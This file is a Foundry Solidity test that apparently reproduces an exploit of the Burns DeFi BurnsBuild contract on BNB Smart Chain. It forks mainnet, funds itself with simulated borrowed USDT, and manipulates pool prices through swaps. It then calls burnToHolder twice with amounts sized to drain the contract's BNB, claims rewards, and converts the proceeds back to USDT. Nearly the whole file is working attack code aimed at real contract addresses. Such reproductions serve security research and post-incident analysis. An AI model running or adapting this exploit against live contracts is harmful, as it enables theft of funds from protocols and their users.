// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IDodo.sol";
import "@interface/IPancakeV2.sol";

import "./IBurnsBuild.sol";

IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant Burns = IERC20(0x91f1d3C7ddB8d5E290e71f893baD45F16E8Bd7BA);
WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

IDODO constant USDT_USDC_Pool = IDODO(
    0xD5F05644EF5d0a36cA8C8B5177FfBd09eC63F92F
);

IPancakePairV2 constant USDT_WBNB_Pool = IPancakePairV2(
    0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
);
IPancakePairV2 constant Burns_WBNB = IPancakePairV2(
    0x928cd66dFA268C69a37Be93BF7759dc8Ee676Bf8
);
IPancakeRouterV2 constant PancakeRouter = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IBurnsBuild constant BurnsBuild_ = IBurnsBuild(
    payable(0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD)
);

contract BurnsDefiTest is Test {
    address alice = makeAddr("alice");

    function setUp() public {
        vm.createSelectFork("bsc", 35858189);

        deal(address(USDT), address(this), 0);
        deal(address(this), 0);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        deal(address(USDT), address(this), 250000 ether);

        USDTToBurns(250000 ether);

        address[] memory path = new address[](2);
        path[0] = address(Burns);
        path[1] = address(BNB);
        uint256 amountOutBNB = 50 ether;
        // 目标输出50bnb 需要的输入量
        uint256[] memory amounts = PancakeRouter.getAmountsIn(
            amountOutBNB,
            path
        );
        BurnsBuild_.burnToHolder(amounts[0], alice);

        // 目标输出剩余的BNB 需要的输入量
        uint256 amountOutBNB2 = address(Burns).balance - amountOutBNB;
        amounts = PancakeRouter.getAmountsIn(amountOutBNB2, path);
        BurnsBuild_.burnToHolder(amounts[0], alice);

        BurnsBuild_.receiveRewards(address(this));

        BNB.deposit{value: address(this).balance}();

        WBNBToUSDT();
        BurnsToUSDT();

        USDT.transfer(address(1), 250000 ether);
        print("USDT after", USDT.balanceOf(address(this)), 18);
        print("Burns balance", Burns.balanceOf(alice), 18);
    }

    function USDTToBurns(uint256 amount) private {
        // Transfer borrowed USDT to USDT/WBNB pair and obtain WBNB to deposit to Burns/WBNB pair
        USDT.transfer(address(USDT_WBNB_Pool), amount);
        (uint112 reserveUSDT, uint112 reserveWBNB, ) = USDT_WBNB_Pool
            .getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(
            amount,
            reserveUSDT,
            reserveWBNB
        );
        // Deposit WBNB to Burns/WBNB
        USDT_WBNB_Pool.swap(0, amountWBNB, address(Burns_WBNB), "");

        (uint112 reserveBurns, uint112 _reserveWBNB, ) = Burns_WBNB
            .getReserves();
        uint256 amountBurns = PancakeRouter.getAmountOut(
            amountWBNB,
            _reserveWBNB,
            reserveBurns
        );
        // Swap deposited WBNB to Burns tokens
        Burns_WBNB.swap(amountBurns, 0, address(this), "");
    }

    function WBNBToUSDT() private {
        uint256 amountWBNB = BNB.balanceOf(address(this));
        BNB.transfer(address(USDT_WBNB_Pool), amountWBNB);
        (uint112 reserveUSDT, uint112 reserveWBNB, ) = USDT_WBNB_Pool
            .getReserves();
        uint256 amountUSDT = PancakeRouter.getAmountOut(
            amountWBNB,
            reserveWBNB,
            reserveUSDT
        );
        USDT_WBNB_Pool.swap(amountUSDT, 0, address(this), "");
    }

    function BurnsToUSDT() private {
        Burns.transfer(address(Burns_WBNB), Burns.balanceOf(address(this)));
        (uint112 reserveBurns, uint112 reserveWBNB, ) = Burns_WBNB
            .getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(
            Burns.balanceOf(address(Burns_WBNB)) - reserveBurns,
            reserveBurns,
            reserveWBNB
        );
        Burns_WBNB.swap(0, amountWBNB, address(USDT_WBNB_Pool), "");

        (uint112 reserveUSDT, uint112 _reserveWBNB, ) = USDT_WBNB_Pool
            .getReserves();
        uint256 amountUSDT = PancakeRouter.getAmountOut(
            amountWBNB,
            _reserveWBNB,
            reserveUSDT
        );
        USDT_WBNB_Pool.swap(amountUSDT, 0, address(this), "");
    }

    receive() external payable {}
}
